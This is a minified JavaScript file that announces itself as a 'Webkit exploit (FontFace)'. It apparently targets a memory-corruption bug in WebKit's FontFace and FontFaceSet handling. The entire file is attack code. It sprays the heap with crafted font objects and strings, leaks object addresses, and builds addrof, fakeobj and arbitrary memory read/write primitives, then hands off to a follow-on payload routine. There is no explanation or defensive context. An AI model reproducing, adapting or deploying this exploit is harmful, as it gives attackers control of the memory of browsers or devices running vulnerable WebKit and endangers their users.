var PAGE_SIZE=16384,SIZEOF_CSS_FONT_FACE=184,HASHMAP_BUCKET=208,STRING_OFFSET=20,SPRAY_FONTS=4106,GUESS_FONT=8594325504,NPAGES=20,INVALID_POINTER=0,HAMMER_FONT_NAME="font8",HAMMER_NSTRINGS=700;function hex(a){return"number"==typeof a?"0x"+new Number(a).toString(16):""+a}async function run_fontface(){function a(a){for(var b="",c=0;8>c;c++)b+=String.fromCharCode(a%256),a=(a-a%256)/256;return b}function b(a,b){b===void 0&&(b=0);for(var c=0,d=7;0<=d;d--)c=256*c+a.charCodeAt(b+d);return c}function c(a,b){var c=b+"\0".repeat(a-STRING_OFFSET-8-b.length)+v++;return u[c]=1,w.push(c),c}function d(b,e){var f="";f+="0000",f+="\xFF\0\0\0\xFF\xFF\xFF\xFF",f+=a(b),f+=a(2147483668),B="",B+=a(29),B+=a(F),B+=a(F+SIZEOF_CSS_FONT_FACE),B+=a(F+2*SIZEOF_CSS_FONT_FACE);for(var g=0;18>g;g++)B+=a(INVALID_POINTER);for(var g=0;256>g;g++)c(HASHMAP_BUCKET,B);ffses[e]=new FontFaceSet([p[E],p[E+1],p[E+2],r]);c(HASHMAP_BUCKET,B);var h=c(HASHMAP_BUCKET,f);return p[E].family=e+"_evil1",p[E+1].family=e+"_evil2",p[E+2].family=e+"_evil3",H.push(h),1e3>h.length?d(b,e+"_"):h}function e(a){return s[257][32]=a,o[0]=s[258][0],4294967296*n[1]+n[0]}function f(a){return n[0]=a,n[1]=(a-a%4294967296)/4294967296,s[258][0]=o[0],s[257][32]}function g(b,c){c[4]=0|b,c[5]=0|b/4294967296}function h(b){return b[4]+4294967296*b[5]}function j(a,b){g(a,Z),Z[6]=b}print("[+] Webkit exploit (FontFace)"),await sleep(0);for(var k=new ArrayBuffer(8),l=new Uint8Array(k),n=new Uint32Array(k),o=new Float64Array(k),p=[],q=0;q<SPRAY_FONTS;q++)p.push(new FontFace("font1","",{}));var r=new FontFace("font2","url(data:text/html,)",{});p.push(r);for(var s=[],q=0;512>q;q++)s.push(Array(31));s[256][0]=1.5,s[257][0]={},s[258][0]=1.5;var t={a:s[256],b:new Uint32Array(1),c:!0},u={},v=1e7,w=[],x=GUESS_FONT,y=!0,z=0,A=0;window.ffses={};do{for(var B=a(NPAGES+2),q=0;q<NPAGES;q++)B+=a(x+q*PAGE_SIZE);B+=a(INVALID_POINTER);for(var q=0;256>q;q++)c(HASHMAP_BUCKET,B);for(var C=ffses["search_"+ ++A]=new FontFaceSet(p),D=c(HASHMAP_BUCKET,B),E=null,F=null,q=0;q<SPRAY_FONTS;q++)if(p[q].family="search"+A,D.substr(0,B.length)!=B){E=q;for(var G=D.substr(0,B.length),q=1;q<=NPAGES;q++)if(G.substr(8*q,8)!=B.substr(8*q,8)){F=b(B.substr(8*q,8));break}0==z++&&(x=F+32768,F=null);break}(y=!y)&&(x+=NPAGES*PAGE_SIZE)}while(null===F);var B="";B+=a(26),B+=a(F),B+=a(F+SIZEOF_CSS_FONT_FACE);for(var q=0;19>q;q++)B+=a(INVALID_POINTER);for(var q=0;256>q;q++)c(HASHMAP_BUCKET,B);for(var H=[],q=0;;q++){ffses["ffs_leak_"+q]=new FontFaceSet([p[E],p[E+1],r]);var I=c(HASHMAP_BUCKET,B);H.push(c(HASHMAP_BUCKET,B)),p[E].family="evil2",p[E+1].family="evil3";var J=b(I.substr(I.length-8));if(281474976710656>J)break}for(var K=d(J,"ffs3"),q=0;1e5>q;q++)c(128,"");for(var L=[],q=0;65536>q;q++)L.push({value:1094927426}),L.push({value:t});for(var M=null;null===M;){Object.defineProperties({},L);for(var q=0;;q++)if(66==K.charCodeAt(q)&&68==K.charCodeAt(q+1)&&67==K.charCodeAt(q+2)&&65==K.charCodeAt(q+3)&&0==K.charCodeAt(q+4)&&0==K.charCodeAt(q+5)&&254==K.charCodeAt(q+6)&&255==K.charCodeAt(q+7)&&14==K.charCodeAt(q+24)){M=b(K,q+32);break}}for(var N=d(M,"ffs4"),O=b(N,16),P=b(N,24),Q=d(O,"ffs5"),R=b(Q,8),S=d(P,"ffs6"),q=0;8>q;q++)l[q]=S.charCodeAt(q);var T=n[0],U=n[1];n[0]=65536,n[1]=0,s[257][1]={},s[257][0]=o[0],n[0]=0|F+12*SIZEOF_CSS_FONT_FACE,n[1]=(F-F%4294967296)/4294967296,s[256][q]=o[0],pp_s="",pp_s+=a(56);for(var q=0;12>q;q++)pp_s+=a(F+q*SIZEOF_CSS_FONT_FACE);var V="";V+="0000",V+=a(INVALID_POINTER),V+=a(R),V+="\0\0\0\0\"\0\0\0";for(var W=[],q=0;12>q;q++)W.push(p[E+q]);W.push(r);for(var X=[p[E+12]],q=0;5>q;q++)X.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(var q=0;q<HAMMER_NSTRINGS;q++)c(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(W),c(HASHMAP_BUCKET,pp_s),ffses.ffs8=new FontFaceSet(X);var Y=c(HASHMAP_BUCKET,V);H.push(Y);for(var q=0;13>q;q++)p[E+q].family="hammer"+q;var Z=new Uint32Array(8),$=new Uint8Array(1),_=new Uint32Array(8),aa={obj:null},ba=e($),ca=e(aa);n[0]=T,n[1]=U,l[6]=7;var da={jscell:o[0],butterfly:!0,buffer:Z,size:22136};window.addrof=function(a){return aa.obj=a,h(_)},window.fakeobj=function(a){return g(a,_),aa.obj},window.read_mem=function(a,b){j(a,b);for(var c=[],d=0;d<b;d++)c.push($[d]);return c},window.write_mem=function(a,b){j(a,b.length);for(var c=0;c<b.length;c++)$[c]=b[c]},window.read_ptr_at=function(a){for(var b=0,c=read_mem(a,8),d=7;0<=d;d--)b=256*b+c[d];return b},window.write_ptr_at=function(a,b){for(var c=[],e=0;8>e;e++)c.push(255&b),b/=256;write_mem(a,c)},function(){var a=f(e(da)+16);a[4]=ba,a[5]=(ba-ba%4294967296)/4294967296,da.buffer=_,a[4]=ca,a[5]=(ca-ca%4294967296)/4294967296,a=null}(),function(){var a=read_ptr_at(addrof(Y)+8)-208;write_mem(a,read_mem(a-96,208));for(var b,c=0;c<H.length;c++)b=read_ptr_at(addrof(H[c])+8),write_ptr_at(b,4294967296*(HASHMAP_BUCKET-20)+1),write_ptr_at(b+8,b+20),write_ptr_at(b+16,2147483668);write_ptr_at(R+248,133143986207)}();let ea=new Uint32Array(8),fa=new Uint32Array(2),ga=addrof(fa),ha=fakeobj(addrof(da)+16);da.buffer=fa,ha[7]=1,da.buffer=ea,ha[4]=ga,ha[5]=(ga-ga%4294967296)/4294967296,ha[7]=1;window.p={write8:function(a,b){ea[4]=a.low,ea[5]=a.hi,b instanceof int64?(fa[0]=b.low,fa[1]=b.hi):(fa[0]=b,fa[1]=0)},write4:function(a,b){ea[4]=a.low,ea[5]=a.hi,fa[0]=b instanceof int64?b.low:b},write2:function(a,b){ea[4]=a.low,ea[5]=a.hi;let c=4294901760&fa[0];fa[0]=b instanceof int64?65535&b.low|c:65535&b|c},write1:function(a,b){ea[4]=a.low,ea[5]=a.hi;let c=4294967040&fa[0];fa[0]=b instanceof int64?255&b.low|c:255&b|c},read8:function(a){return ea[4]=a.low,ea[5]=a.hi,new int64(fa[0],fa[1])},read4:function(a){return ea[4]=a.low,ea[5]=a.hi,fa[0]},read2:function(a){return ea[4]=a.low,ea[5]=a.hi,65535&fa[0]},read1:function(a){return ea[4]=a.low,ea[5]=a.hi,255&fa[0]},leakval:function(a){return aa.obj=a,new int64(_[4],_[5])}},run_hax()}